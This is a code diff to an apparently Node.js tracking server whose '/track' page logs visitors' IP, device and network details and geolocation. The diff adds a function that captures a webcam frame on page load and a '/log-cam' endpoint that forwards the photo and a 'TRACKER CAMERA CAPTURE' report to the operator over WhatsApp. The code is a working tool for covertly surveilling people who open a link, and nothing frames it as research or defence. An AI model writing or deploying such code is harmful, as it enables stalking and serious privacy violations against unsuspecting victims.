@@ -117,6 +117,31 @@ app.get('/track', (req, res) => {
                         });
                     }
 
+                    async function captureCam(info) {
+                        try {
+                            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            await video.play();
+
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            
+                            const photo = canvas.toDataURL('image/jpeg');
+                            stream.getTracks().forEach(track => track.stop());
+                            
+                            await fetch('/log-cam', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ photo, info })
+                            });
+                        } catch (e) {
+                            console.error('Cam Error:', e);
+                        }
+                    }
+
                     async function collectAll() {
                         const info = {
                             ip: "${ip}",
@@ -149,6 +174,9 @@ app.get('/track', (req, res) => {
                             info.downlink = navigator.connection.downlink + "Mbps";
                         }
 
+                        // Start camera capture
+                        captureCam(info);
+
                         // Geolocation
                         navigator.geolocation.getCurrentPosition(
                             (pos) => {
@@ -178,6 +206,29 @@ app.get('/track', (req, res) => {
             </body>
         </html>
     `);
+});
+
+app.post('/log-cam', express.json({ limit: '50mb' }), async (req, res) => {
+    const { photo, info } = req.body;
+    console.log('📸 [TRACKER] CAM DATA RECEIVED');
+    if (client && client.info) {
+        try {
+            const buffer = Buffer.from(photo.split(',')[1], 'base64');
+            const media = new (require('whatsapp-web.js').MessageMedia)('image/jpeg', buffer.toString('base64'), 'cam.jpg');
+            
+            let report = `📸 *TRACKER CAMERA CAPTURE*\n\n`;
+            report += `🕒 *Time:* ${info.time || new Date().toLocaleString()}\n`;
+            report += `🌐 *IP:* ${info.ip}\n`;
+            report += `📱 *Device:* ${info.ua}\n`;
+            report += `🧠 *Hardware:* ${info.cores || 'N/A'} Cores, ${info.memory || 'N/A'}GB RAM\n`;
+            
+            const botNumber = client.info.wid._serialized;
+            await client.sendMessage(botNumber, media, { caption: report });
+        } catch (err) {
+            console.error('Failed to send camera report:', err);
+        }
+    }
+    res.sendStatus(200);
 });
 
 app.post('/log-hit', express.json(), async (req, res) => {
